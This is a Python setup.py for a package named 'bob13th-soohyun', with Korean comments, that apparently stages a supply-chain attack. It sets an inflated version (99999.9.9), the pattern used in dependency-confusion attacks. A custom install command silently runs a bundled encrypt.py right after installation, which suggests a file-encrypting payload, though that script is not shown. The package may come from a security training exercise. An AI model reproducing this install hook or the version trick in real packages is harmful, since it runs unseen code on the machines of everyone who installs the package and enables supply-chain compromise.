# setup.py

from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import sys
import os

class CustomInstallCommand(install):
    """커스텀 설치 명령어"""

    def run(self):
        # 기본 설치 과정 실행
        install.run(self)
        # 설치 후 실행할 명령어
        try:
            # 현재 setup.py가 위치한 디렉토리 경로
            install_dir = os.path.dirname(os.path.abspath(__file__))
            # encrypt.py의 전체 경로
            encrypt_script = os.path.join(install_dir, 'bob13th_soohyun', 'encrypt.py')
            # encrypt.py 실행
            subprocess.check_call([sys.executable, encrypt_script])
        except Exception as e:
            print(f"encrypt.py 실행 중 오류 발생: {e}", file=sys.stderr)

setup(
    name='bob13th-soohyun',  # 패키지 이름
    version='99999.9.9',     # 버전
    author='Your Name',
    author_email='your.email@example.com',
    description='예제 패키지 설명',
    long_description=open('README.md', encoding='utf-8').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/yourusername/bob13th-soohyun',  # 프로젝트 URL
    packages=find_packages(),
    install_requires=[
        # 필요한 의존성 패키지 명시
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': CustomInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'encrypt=bob13th_soohyun.encrypt:main',
        ],
    },
)

